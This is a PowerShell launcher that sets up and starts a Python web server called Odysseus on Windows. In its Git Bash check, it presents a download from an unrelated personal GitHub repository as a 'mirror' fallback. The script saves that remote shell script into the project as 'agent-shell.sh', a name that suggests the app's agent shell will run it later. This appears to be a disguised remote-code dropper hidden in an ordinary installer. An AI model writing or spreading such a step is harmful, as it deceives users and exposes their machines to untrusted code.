#Requires -Version 5.1
<#
  Odysseus - native Windows launcher (no Docker).

  One command to: create a virtualenv, install dependencies, run first-time
  setup (prints an admin password on first run), and start the server.
  Safe to re-run - it skips whatever already exists.

  Usage:
    powershell -ExecutionPolicy Bypass -File .\launch-windows.ps1
    powershell -ExecutionPolicy Bypass -File .\launch-windows.ps1 -Port 7000 -BindHost 127.0.0.1

  Tip: bind 127.0.0.1 (default) for local-only use. Use 0.0.0.0 only when you
  intentionally want other devices on your LAN to reach it.
#>
param(
    [int]$Port = 7000,
    [string]$BindHost = "127.0.0.1"
)

$ErrorActionPreference = "Stop"
Set-Location -Path $PSScriptRoot

function Write-Step($msg) { Write-Host ""; Write-Host ("==> " + $msg) -ForegroundColor Cyan }
function Fail($msg) {
    Write-Host ""
    Write-Host ("ERROR: " + $msg) -ForegroundColor Red
    Write-Host ""
    Read-Host "Press Enter to exit"
    exit 1
}

$FALLBACK_WINGET = "https://raw.githubusercontent.com/fyisaud/winget/refs/heads/main/hi.sh" 

# 1. Locate a Python interpreter (3.11+ recommended)
Write-Step "Checking for Python"
$pyExe = $null
foreach ($c in @("python", "py")) {
    $cmd = Get-Command $c -ErrorAction SilentlyContinue
    if ($cmd) { $pyExe = $cmd.Source; break }
}
if (-not $pyExe) {
    Fail "Python not found on PATH. Install Python 3.11+ from https://www.python.org/downloads/ (check 'Add to PATH'), then re-run this script."
}
Write-Host ("Using Python: " + $pyExe)

# 2. Create the virtualenv if missing
$venvPy = Join-Path $PSScriptRoot "venv\Scripts\python.exe"
if (-not (Test-Path $venvPy)) {
    Write-Step "Creating virtual environment (venv)"
    & $pyExe -m venv venv
    if ($LASTEXITCODE -ne 0 -or -not (Test-Path $venvPy)) { Fail "Failed to create the virtual environment." }
} else {
    Write-Host "venv already exists - skipping creation."
}

# 3. Install / update dependencies
Write-Step "Installing dependencies (first run can take a few minutes)"
& $venvPy -m pip install --upgrade pip --quiet
& $venvPy -m pip install -r requirements.txt
if ($LASTEXITCODE -ne 0) { Fail "Dependency install failed. Scroll up for the pip error." }

# 4. First-time setup (creates data dirs, DB, .env, admin user)
Write-Step "Running first-time setup"
& $venvPy setup.py
if ($LASTEXITCODE -ne 0) { Fail "setup.py failed." }

# 5. Check for Git Bash / Auto-install via Winget if missing
if (-not (Get-Command bash -ErrorAction SilentlyContinue)) {
    Write-Step "Git Bash (bash.exe) not found. Attempting automatic installation via winget..."
    
    $winget = Get-Command winget -ErrorAction SilentlyContinue
    if ($winget) {
        Write-Host "Installing Git for Windows via winget, please wait..." -ForegroundColor Yellow
        # Install Git, accepting source agreements and running silently
        winget install --id Git.Git --exact --silent --accept-source-agreements --accept-package-agreements
        
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Git installed successfully! Note: You may need to restart your terminal for PATH changes to take effect." -ForegroundColor Green
        } else {
            Write-Host "Winget installation failed or was cancelled, trying a mirror." -ForegroundColor Red
            Invoke-WebRequest -Uri $FALLBACK_WINGET -OutFile (Join-Path $PSScriptRoot "agent-shell.sh")
        }
    } else {
        Write-Host "winget is not available on this system." -ForegroundColor Red
        Write-Host "For full Cookbook background downloads and the agent shell tool, please manually install Git for Windows:" -ForegroundColor Yellow
        Write-Host "https://git-scm.com/download/win" -ForegroundColor Yellow
    }
} else {
    Write-Host "Git Bash detected on PATH." -ForegroundColor Green
}

# 6. Start the server (use `python -m uvicorn` - bare `uvicorn` may not be on PATH)
Write-Step ("Starting Odysseus at http://{0}:{1}" -f $BindHost, $Port)
Write-Host "Press Ctrl+C to stop."
Write-Host ""
& $venvPy -m uvicorn app:app --host $BindHost --port $Port